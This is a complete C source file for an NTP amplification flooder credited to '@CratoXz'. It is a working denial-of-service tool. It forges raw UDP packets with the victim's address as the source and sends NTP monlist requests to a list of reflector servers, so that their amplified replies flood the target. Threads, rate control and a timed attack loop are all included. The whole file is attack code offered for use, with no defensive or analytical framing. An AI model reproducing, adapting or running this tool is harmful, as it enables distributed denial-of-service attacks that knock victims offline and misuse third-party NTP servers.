/*
 * NTP Amplification Flooder
 * Made by @CratoXz
 *
 * Usage: ./ntp <target_ip[:port]> <reflector_list> <threads> <pps_limit> <time_seconds>
 * Example: ./ntp 192.168.12.1:25573 ntp.txt 8 50000 60
 *
 * reflector_list lines: "1.2.3.4" or "1.2.3.4:123"
 * Target: bare IP = random spoofed source port; IP:port = fixed spoofed source port
 */

#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9

static uint32_t Q[4096], c = 362436;

struct list {
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};

struct list *head = NULL;
volatile int limiter = 0;
volatile unsigned int pps = 0;
volatile unsigned int sleeptime = 100;

struct thread_data {
    int thread_id;
    struct list *list_node;
    struct sockaddr_in sin;
    uint16_t target_port;   /* 0 = random */
};

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for (; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 8);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
}

void setup_udp_header(struct udphdr *udph) {
    udph->source = htons(5678);
    udph->dest = htons(123);
    udph->check = 0;
    memcpy((char *)udph + sizeof(struct udphdr), "\x17\x00\x03\x2a\x00\x00\x00\x00", 8);
    udph->len = htons(sizeof(struct udphdr) + 8);
}

void *flood(void *par1) {
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    struct list *list_node = td->list_node;
    struct sockaddr_in sin = td->sin;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    int tmp = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        perror("setsockopt IP_HDRINCL");
        exit(EXIT_FAILURE);
    }

    init_rand(time(NULL) ^ (td->thread_id << 16));
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);

    // spoof source = target
    iph->saddr = sin.sin_addr.s_addr;

    unsigned int i = 0;
    while (1) {
        iph->daddr = list_node->data.sin_addr.s_addr;
        udph->dest = list_node->data.sin_port;

        if (td->target_port)
            udph->source = htons(td->target_port);
        else
            udph->source = htons((rand_cmwc() % 55535) + 10000);

        iph->id = htons(rand_cmwc() & 0xFFFF);
        iph->check = 0;
        iph->check = csum((unsigned short *)datagram, ntohs(iph->tot_len) >> 1);

        sendto(s, datagram, ntohs(iph->tot_len), 0,
               (struct sockaddr *)&list_node->data, sizeof(list_node->data));

        list_node = list_node->next;
        pps++;

        if (i >= (unsigned)limiter) {
            i = 0;
            if (sleeptime)
                usleep(sleeptime);
        }
        i++;
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        fprintf(stderr, "\x1b[1;36mMade by @CratoXz\x1b[0m\n");
        fprintf(stderr, "Usage: %s <target_ip[:port]> <reflector_list> <threads> <pps_limit> <time_sec>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.12.1:25573 ntp.txt 8 50000 60\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    printf("\x1b[1;36mMade by @CratoXz\x1b[0m\n");
    printf("\x1b[0;32mStarting NTP amplification...\x1b[0m\n");

    srand(time(NULL));
    head = NULL;

    int num_threads = atoi(argv[3]);
    int maxpps = atoi(argv[4]);
    int duration = atoi(argv[5]);
    if (num_threads < 1) num_threads = 1;
    if (duration < 1) duration = 30;

    // load reflector list
    FILE *list_fd = fopen(argv[2], "r");
    if (!list_fd) {
        perror("fopen reflector list");
        exit(EXIT_FAILURE);
    }

    char buffer[128];
    int count = 0;
    while (fgets(buffer, sizeof(buffer), list_fd)) {
        buffer[strcspn(buffer, "\r\n")] = 0;
        if (buffer[0] == '\0' || buffer[0] == '#')
            continue;

        struct list *node = (struct list *)calloc(1, sizeof(struct list));
        if (!node) continue;

        node->data.sin_family = AF_INET;
        node->data.sin_port = htons(123);

        // support "ip" and "ip:port"
        char *host = buffer;
        char *colon = strrchr(buffer, ':');
        if (colon) {
            *colon = '\0';
            node->data.sin_port = htons((uint16_t)atoi(colon + 1));
        }

        if (inet_pton(AF_INET, host, &node->data.sin_addr) != 1) {
            free(node);
            continue;
        }

        if (!head) {
            head = node;
            head->next = head;
            head->prev = head;
        } else {
            node->prev = head;
            node->next = head->next;
            head->next->prev = node;
            head->next = node;
        }
        count++;
    }
    fclose(list_fd);

    if (!head || count == 0) {
        fprintf(stderr, "No valid reflectors loaded\n");
        exit(EXIT_FAILURE);
    }
    printf("Loaded %d reflectors\n", count);

    // parse target "ip" or "ip:port"
    char target_buf[64];
    strncpy(target_buf, argv[1], sizeof(target_buf) - 1);
    target_buf[sizeof(target_buf) - 1] = '\0';

    uint16_t target_port = 0;
    char *tcolon = strrchr(target_buf, ':');
    if (tcolon) {
        *tcolon = '\0';
        int p = atoi(tcolon + 1);
        if (p > 0 && p < 65536)
            target_port = (uint16_t)p;
    }

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_buf, &sin.sin_addr) != 1) {
        fprintf(stderr, "Invalid target IP\n");
        exit(EXIT_FAILURE);
    }

    if (target_port)
        printf("Target port locked to %u\n", target_port);
    else
        printf("Target port: random\n");

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    struct thread_data *td = malloc(num_threads * sizeof(struct thread_data));
    struct list *current = head;

    for (int i = 0; i < num_threads; i++) {
        td[i].thread_id = i;
        td[i].sin = sin;
        td[i].list_node = current;
        td[i].target_port = target_port;
        pthread_create(&threads[i], NULL, flood, &td[i]);
        current = current->next;
    }

    printf("Attacking %s with %d threads...\n", argv[1], num_threads);

    int multiplier = 20;
    for (int i = 0; i < duration * multiplier; i++) {
        usleep(1000000 / multiplier);

        if ((int)(pps * multiplier) > maxpps) {
            if (limiter < 1)
                sleeptime += 50;
            else
                limiter--;
        } else {
            limiter++;
            if (sleeptime > 25)
                sleeptime -= 25;
            else
                sleeptime = 0;
        }
        pps = 0;
    }

    printf("Done.\n");
    return 0;
}
